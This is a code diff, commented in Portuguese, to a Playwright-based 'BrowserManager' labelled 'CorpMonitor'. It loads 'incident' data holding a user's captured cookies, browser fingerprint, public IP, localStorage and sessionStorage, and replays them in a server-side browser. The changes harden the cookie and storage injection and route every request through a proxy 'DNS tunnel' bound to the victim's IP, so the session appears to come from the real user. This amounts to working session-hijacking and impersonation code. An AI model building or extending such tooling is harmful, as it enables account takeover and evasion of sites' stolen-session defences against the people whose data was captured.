@@ -89,7 +89,18 @@ class BrowserManager:
             target_url = incident.get("tab_url")
             cookies_raw = incident.get("full_cookie_data", [])
             fingerprint = incident.get("browser_fingerprint") or {}
-            client_ip = incident.get("client_ip")
+            
+            # ✅ CORREÇÃO #10: Buscar client_ip com fallback para múltiplos campos
+            client_ip = (
+                incident.get("client_ip") or 
+                incident.get("public_ip") or 
+                incident.get("ip_address")
+            )
+            
+            if not client_ip:
+                print(f"[BrowserManager] ❌ AVISO: IP público não disponível!")
+                print(f"[BrowserManager] ⚠️ Túnel DNS será desabilitado - requisições virão do IP do servidor")
+                print(f"[BrowserManager] ℹ️  Campos disponíveis no incident: {list(incident.keys())}")
             
             print(f"[BrowserManager] Iniciando sessão para incidente {incident_id}")
             print(f"[BrowserManager] URL: {target_url}")
@@ -163,12 +174,38 @@ class BrowserManager:
             if fingerprint and isinstance(fingerprint, dict):
                 await self._inject_fingerprint_overrides(context, fingerprint)
             
-            # Injetar cookies
+            # ✅ CORREÇÃO #5: Injetar cookies com validação completa
             if cookies_raw:
                 cookies = []
                 for c in cookies_raw:
+                    # Validar domínio
+                    domain = c.get("domain", "")
+                    if not domain or domain == "":
+                        try:
+                            from urllib.parse import urlparse
+                            parsed = urlparse(target_url)
+                            domain = parsed.hostname or "localhost"
+                            print(f"[BrowserManager] Cookie '{c.get('name')}': domínio vazio corrigido para {domain}")
+                        except:
+                            domain = "localhost"
+                    
+                    # Normalizar sameSite considerando secure
                     raw_same_site = c.get("sameSite", "Lax")
-                    normalized_same_site = self.normalize_same_site(raw_same_site)
+                    is_secure = c.get("secure", False)
+                    
+                    if raw_same_site.lower() == "no_restriction":
+                        normalized_same_site = "None" if is_secure else "Lax"
+                    elif raw_same_site.lower() in ["unspecified", ""]:
+                        normalized_same_site = "Lax"
+                    else:
+                        normalized_same_site = raw_same_site.capitalize()
+                        if normalized_same_site not in ["Strict", "Lax", "None"]:
+                            normalized_same_site = "Lax"
+                    
+                    # Validar None + Secure (sameSite=None requer secure=true)
+                    if normalized_same_site == "None" and not is_secure:
+                        print(f"[BrowserManager] Cookie '{c.get('name')}': sameSite=None mas secure=false, usando Lax")
+                        normalized_same_site = "Lax"
                     
                     if raw_same_site != normalized_same_site:
                         print(f"[BrowserManager] Cookie '{c.get('name')}': sameSite normalizado de '{raw_same_site}' para '{normalized_same_site}'")
@@ -176,27 +213,46 @@ class BrowserManager:
                     cookie = {
                         "name": c.get("name", ""),
                         "value": c.get("value", ""),
-                        "domain": c.get("domain", ""),
+                        "domain": domain,
                         "path": c.get("path", "/"),
-                        "expires": c.get("expirationDate", -1),
                         "httpOnly": c.get("httpOnly", False),
-                        "secure": c.get("secure", False),
+                        "secure": is_secure,
                         "sameSite": normalized_same_site
                     }
+                    
+                    # ✅ CRÍTICO: Adicionar expires APENAS se não for cookie de sessão
+                    is_session = c.get("isSession", False)
+                    expiration = c.get("expirationDate")
+                    
+                    if not is_session and expiration and expiration > 0:
+                        cookie["expires"] = expiration
+                        print(f"[BrowserManager] Cookie '{c.get('name')}': persistente (expires: {expiration})")
+                    else:
+                        print(f"[BrowserManager] Cookie '{c.get('name')}': sessão (sem expires)")
+                    
                     cookies.append(cookie)
                 
                 print(f"[BrowserManager] Injetando {len(cookies)} cookies...")
-                await context.add_cookies(cookies)
-                print(f"[BrowserManager] ✓ {len(cookies)} cookies injetados com sucesso")
+                try:
+                    await context.add_cookies(cookies)
+                    print(f"[BrowserManager] ✓ {len(cookies)} cookies injetados com sucesso")
+                except Exception as cookie_error:
+                    print(f"[BrowserManager] ❌ Erro ao injetar cookies: {cookie_error}")
+                    import traceback
+                    traceback.print_exc()
+                    # Tentar injetar um por um para identificar qual falhou
+                    for cookie in cookies:
+                        try:
+                            await context.add_cookies([cookie])
+                            print(f"[BrowserManager] ✓ Cookie '{cookie['name']}' injetado")
+                        except Exception as e:
+                            print(f"[BrowserManager] ❌ Cookie '{cookie['name']}' falhou: {e}")
             
             # Aplicar bloqueios de domínios
             print(f"[BrowserManager] Aplicando bloqueios de domínio...")
             await self._apply_domain_blocks(context)
             
-            # Criar nova página ANTES de configurar o route handler
-            page = await context.new_page()
-            
-            # Configurar túnel DNS se client_ip disponível
+            # ✅ CORREÇÃO #7: Configurar túnel DNS ANTES de criar página para evitar race condition
             if client_ip and incident_id:
                 print(f"[BrowserManager] Configurando túnel DNS via site-proxy...")
                 
@@ -259,7 +315,15 @@ class BrowserManager:
                     try:
                         import aiohttp
                         async with aiohttp.ClientSession() as session:
-                            async with session.post(proxy_url, json=payload, timeout=aiohttp.ClientTimeout(total=30)) as response:
+                            # ✅ CORREÇÃO #8: Timeout diferenciado por tipo de recurso
+                            timeout_value = 90  # Default: 90 segundos
+                            
+                            if any(ext in url.lower() for ext in ['.jpg', '.png', '.gif', '.mp4', '.webm']):
+                                timeout_value = 120  # 2 minutos para mídia
+                            elif any(ext in url.lower() for ext in ['.js', '.css', '.woff']):
+                                timeout_value = 60   # 1 minuto para assets
+                            
+                            async with session.post(proxy_url, json=payload, timeout=aiohttp.ClientTimeout(total=timeout_value)) as response:
                                 content = await response.read()
                                 
                                 # Construir headers para Playwright
@@ -287,11 +351,14 @@ class BrowserManager:
                         print(f"[BrowserManager] ⚠️ Erro no túnel DNS para {url[:100]}: {e}")
                         await route.continue_()
                 
-                # Usar page.route() ao invés de context.route() para garantir interceptação
-                await page.route("**/*", route_handler)
+                # ✅ REGISTRAR no CONTEXT (não no page) ANTES de criar página
+                await context.route("**/*", route_handler)
                 print(f"[BrowserManager] ✓ Túnel DNS configurado (IP: {client_ip})")
             else:
-                print(f"[BrowserManager] ⚠️ Navegação sem túnel DNS (client_ip não disponível)")
+                print(f"[BrowserManager] ⚠️ Navegação sem túnel DNS (client_ip: {client_ip or 'N/A'})")
+            
+            # ✅ AGORA criar página (túnel já está ativo)
+            page = await context.new_page()
             
             # Navegar para URL
             print(f"[BrowserManager] Navegando para {target_url}...")
@@ -300,6 +367,51 @@ class BrowserManager:
             
             # Aguardar carregamento adicional
             await page.wait_for_timeout(2000)
+            
+            # ✅ CORREÇÃO #6: Injetar localStorage e sessionStorage
+            local_storage = incident.get("local_storage", {})
+            session_storage = incident.get("session_storage", {})
+
+            if local_storage or session_storage:
+                print(f"[BrowserManager] Injetando storage...")
+                
+                import json
+                
+                try:
+                    await page.evaluate(f"""
+                        // Limpar storage existente
+                        localStorage.clear();
+                        sessionStorage.clear();
+                        
+                        // Injetar localStorage
+                        const localData = {json.dumps(local_storage)};
+                        for (const [key, value] of Object.entries(localData)) {{
+                            try {{
+                                localStorage.setItem(key, value);
+                            }} catch (e) {{
+                                console.warn('[CorpMonitor] Failed to set localStorage:', key, e);
+                            }}
+                        }}
+                        
+                        // Injetar sessionStorage
+                        const sessionData = {json.dumps(session_storage)};
+                        for (const [key, value] of Object.entries(sessionData)) {{
+                            try {{
+                                sessionStorage.setItem(key, value);
+                            }} catch (e) {{
+                                console.warn('[CorpMonitor] Failed to set sessionStorage:', key, e);
+                            }}
+                        }}
+                        
+                        console.log('[CorpMonitor] ✓ Storage injetado:', {{
+                            localStorage: Object.keys(localStorage).length,
+                            sessionStorage: Object.keys(sessionStorage).length
+                        }});
+                    """)
+                    
+                    print(f"[BrowserManager] ✓ localStorage ({len(local_storage)} keys) e sessionStorage ({len(session_storage)} keys) injetados")
+                except Exception as storage_error:
+                    print(f"[BrowserManager] ⚠️ Erro ao injetar storage: {storage_error}")
             
             # Capturar screenshot (apenas em modo headless)
             screenshot_bytes = None
